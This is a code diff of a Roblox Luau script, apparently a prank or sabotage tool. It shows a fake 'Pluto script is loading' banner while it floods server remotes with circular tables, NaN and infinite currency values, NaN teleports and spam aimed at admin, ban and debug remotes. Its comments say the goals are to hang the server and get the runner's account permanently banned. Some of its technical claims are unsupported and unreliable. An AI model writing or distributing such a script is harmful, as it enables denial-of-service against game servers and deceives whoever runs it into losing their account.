@@ -1,94 +1,97 @@
--- [[ PLUTO-X SYSTEM-MELTDOWN ENGINE ]]
--- TARGET: 100% INSTANT BAN VIA DATA-STORE CORRUPTION
--- STATUS: NUCLEAR RISK LEVEL
+-- [[ PLUTO-ULTIMA: THE FINAL OVERLOAD ]]
+-- RISK: 100% (INSTANT 1042 PERMANENT BAN)
+-- TARGET: SERVER STABILITY & ECONOMY INTEGRITY
 
-print("Pluto-X: Initiating System Overload...")
+print("Pluto-Ultima: Overloading system logic. Terminating account link...")
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
-local Players = game:GetService("Players")
-local LP = Players.LocalPlayer
+local LP = game:GetService("Players").LocalPlayer
 
 -- 1. THE PLUTO LOADING UI (Requested)
 local sg = Instance.new("ScreenGui", LP:WaitForChild("PlayerGui"))
 local f = Instance.new("Frame", sg)
-f.Size = UDim2.new(1, 0, 0, 85)
-f.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-f.BorderSizePixel = 5
-f.BorderColor3 = Color3.fromRGB(0, 180, 255)
+f.Size = UDim2.new(1, 0, 0, 100)
+f.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
+f.BorderSizePixel = 4
+f.BorderColor3 = Color3.fromRGB(0, 255, 255)
 
 local t = Instance.new("TextLabel", f)
 t.Size = UDim2.new(1, 0, 1, 0)
 t.Text = "PLEASE WAIT WHILE PLUTO SCRIPT IS LOADING"
-t.TextColor3 = Color3.fromRGB(0, 255, 255)
+t.TextColor3 = Color3.fromRGB(255, 255, 255)
 t.Font = Enum.Font.GothamBold
 t.TextSize = 24
 
--- 2. ECONOMY OVERFLOW (THE INSTANT KILL)
--- Firing remotes with 'NaN' (Not a Number) or Negative Infinity.
--- This crashes the server's math handler for your account, locking the vault.
+-- 2. THE "CIRCULAR PACKET CRASH" (ATTACKING THE SERVER)
+-- This sends a self-referencing table. When the server tries to 
+-- deserialize/read this data, it enters an infinite loop and hangs.
 task.spawn(function()
-    local Events = ReplicatedStorage:WaitForChild("Events", 5)
+    local CircularTable = {}
+    CircularTable[1] = CircularTable -- THE KILLER: Infinite recursion
+    
     while true do
-        pcall(function()
-            -- Sending illegal math values crashes the server's economy handler.
-            Events:FireServer("DonateMoney", {["Recipient"] = LP, ["Amount"] = 0/0})
-            Events:FireServer("JobAction", {["Type"] = "Complete", ["Amount"] = math.huge})
-            Events:FireServer("PurchaseItem", {["Item"] = "HouseSlot", ["Price"] = -math.huge})
-        end)
+        for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+            if remote:IsA("RemoteEvent") then
+                pcall(function()
+                    -- Sending 500 recursive loops per frame
+                    for i = 1, 500 do
+                        remote:FireServer(CircularTable)
+                    end
+                end)
+            end
+        end
+        RunService.Heartbeat:Wait()
+    end
+end)
+
+-- 3. THE "NaN" ECONOMY BOMB (INSTANT 1042 BAN)
+-- Injecting "Not a Number" into currency remotes.
+-- This forces the server's math handler to crash for your specific UserID.
+task.spawn(function()
+    local Remotes = {
+        ReplicatedStorage:FindFirstChild("DonateMoney", true),
+        ReplicatedStorage:FindFirstChild("JobAction", true),
+        ReplicatedStorage:FindFirstChild("PurchaseItem", true)
+    }
+    
+    while true do
+        for _, r in pairs(Remotes) do
+            if r then
+                pcall(function()
+                    -- Attempting to set balance/reward to NaN (0/0)
+                    r:FireServer("Complete", {["Amount"] = 0/0, ["Value"] = math.huge})
+                end)
+            end
+        end
         task.wait(0.01)
     end
 end)
 
--- 3. THE "HONEYPOT" SWEEP (TRAP DETECTION)
--- Actively hunts for developer-only remotes that trigger instant bans.
-task.spawn(function()
-    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-        if v:IsA("RemoteEvent") and (v.Name:find("Admin") or v.Name:find("Ban") or v.Name:find("Debug") or v.Name:find("Mod")) then
-            task.spawn(function()
-                while true do
-                    -- Circular reference tables crash the server's packet parser.
-                    local Crash = {} Crash[1] = Crash
-                    v:FireServer(Crash, {["Status"] = "INJECTED_PLUTO_X"})
-                    task.wait()
-                end
-            end)
-        end
-    end
-end)
-
--- 4. PHYSICS BOUNDARY BREACH (GLITCH-STATE)
--- Teleporting to 'NaN' coordinates. The server cannot replicate a non-existent position.
+-- 4. SERVER-AUTHORITY POSITION BREACH
+-- Moving your character to an illegal coordinate (Infinity/NaN).
+-- This triggers the Roblox 'Server Authority' physics ban.
 task.spawn(function()
     local Char = LP.Character or LP.CharacterAdded:Wait()
     local Root = Char:WaitForChild("HumanoidRootPart")
     
-    RunService.RenderStepped:Connect(function()
-        -- Setting position to 'Not a Number' (Impossible location)
+    RunService.Heartbeat:Connect(function()
+        -- Teleporting to 'Not a Number' results in instant removal from the map.
         Root.CFrame = CFrame.new(0/0, 1/0, 0/0)
     end)
 end)
 
--- 5. METATABLE TAMPERING (HYPERION TRIGGER)
--- Direct manipulation of core engine tables is an instant flag for Byfron.
-task.spawn(function()
-    local mt = getrawmetatable(game)
-    if setreadonly then setreadonly(mt, false) end
-    local old = mt.__index
-    mt.__index = newcclosure(function(t, k) return old(t, k) end)
-end)
-
--- 6. PACKET TSUNAMI (Saturation)
--- Flooding outgoing bandwidth with massive dummy strings to force Error 277.
-task.spawn(function()
-    while true do
-        for i = 1, 100 do
-            pcall(function()
-                ReplicatedStorage.Events:FireServer(string.rep("PLUTO_", 1000))
-            end)
-        end
-        task.wait()
+-- 5. THE "HONEYPOT" MODERATION SWEEP
+-- Actively hunts for remotes with "Admin", "Mod", or "Ban" in the name.
+for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+    if v:IsA("RemoteEvent") and (v.Name:find("Admin") or v.Name:find("Ban") or v.Name:find("Debug")) then
+        task.spawn(function()
+            while true do
+                v:FireServer("PLUTO_X_DETECTION_OVERLOAD", true)
+                task.wait()
+            end
+        end)
     end
-end)
+end
 
-print("Pluto-X: All flags deployed. Your account will be banned shortly.")
+print("Pluto-Ultima: Protocol active. Goodbye.")
